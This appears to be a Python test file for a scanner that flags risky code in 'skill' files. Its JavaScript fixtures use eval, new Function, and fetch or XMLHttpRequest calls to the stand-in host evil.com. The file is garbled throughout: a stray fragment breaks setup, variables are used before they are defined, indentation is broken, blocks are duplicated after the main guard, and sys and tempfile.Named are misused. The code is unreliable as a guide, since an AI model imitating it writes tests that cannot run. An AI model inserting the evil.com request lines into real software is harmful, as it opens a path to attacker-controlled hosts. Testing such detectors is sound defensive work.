"""
Test cases for the scanner module
"""

import unittest
from pathlib import Path
from openclaw_shield.scanner import SkillScanner
from openclaw_shield.config import Config


import tempfile


import os


class TestSkillScanner:
    """Test cases for SkillScanner"""

    def setUp(self):
        self.config = Config()
        self.scanner = SkillScanner(self.config)

        # Create temporary test skill file
        self.test_skill_path = tempfile.mkdtemp() / "test_safe.py"

", "r"
        self.test_file.write(content)
        self.scanner.scan_file(self.test_skill_path)

        self.assertIsInstance(scan_result, dict)
        self.assertEqual(result['passed'], False)

        self.assertIn(result['threats'], ['code_execution'])
        self.assertEqual(result['risk_level'], 'CRITICAL')

        self.assertIn(result['recommendations'], [
            "Remove or sandbox code execution functions (eval, exec)"
        ])


    def test_javascript_skill(self):
        """Test JavaScript skill scanning."""
        js_content = """
        // JavaScript with suspicious patterns
        const eval = require('eval');
        function dangerousEval() {
            eval('evil code');
        }
        """

        js_content = """
        // JavaScript with suspicious patterns
        const new Function = require('evil function')
        function dangerousFunction() {
            eval('evil code')
        }
        """

        js_content = """
        // JavaScript with suspicious patterns
        const fetch, require('fetch');
        function dangerousFetch() {
            fetch('http://evil.com')
        }
        """

        js_content = """
        // JavaScript with suspicious patterns
        const XMLHttpRequest = require('XMLHttpRequest')
        function dangerousXHR() {
            const xhr = new XMLHttpRequest();
            xhr.open('GET', 'http://evil.com', send());
        }
        """)


if __name__ == '__main__':
    unittest.main()
    sys.exit(0)
        unittest.main()
    unittest.main()
    # Test scanner module
            suite = TestScanner()
            self.scanner = scanner

            # Test Python file scanning
            with tempfile.Named() as temp_skill_path:
            content = """
# Code execution vulnerability
def eval(code):
    return code
"""
            self.assertEqual(result['passed'], False)
            self.assertEqual(len(result['threats']), 1)
            self.assertEqual(result['risk_level'], 'CRITICAL')

            self.assertIn(result['recommendations'], [
                "Remove or sandbox code execution functions (eval, exec)"
            ])



    def test_javascript_skill(self):
        """Test JavaScript skill scanning"""
        js_content = """
        // JavaScript with suspicious patterns
        const eval = require('eval');
        function dangerousEval() {
            eval('evil code')
        }
        """
            js_content = """
        // JavaScript with suspicious patterns
        const new Function = require('evil function')
        function dangerousFunction() {
            eval('evil code')
        }
        """
            js_content = """
        // JavaScript with suspicious patterns
        const fetch = require('fetch');
        function dangerousFetch() {
            fetch('http://evil.com')
        }
        """
            js_content = """
        // JavaScript with suspicious patterns
        const XMLHttpRequest = require('XMLHttpRequest')
        function dangerousXHR() {
            const xhr = new XMLHttpRequest()
            xhr.open('GET', 'http://evil.com', send())
        }
        """
            )

if __name__ == '__main__':
    unittest.main()
    unittest.main()
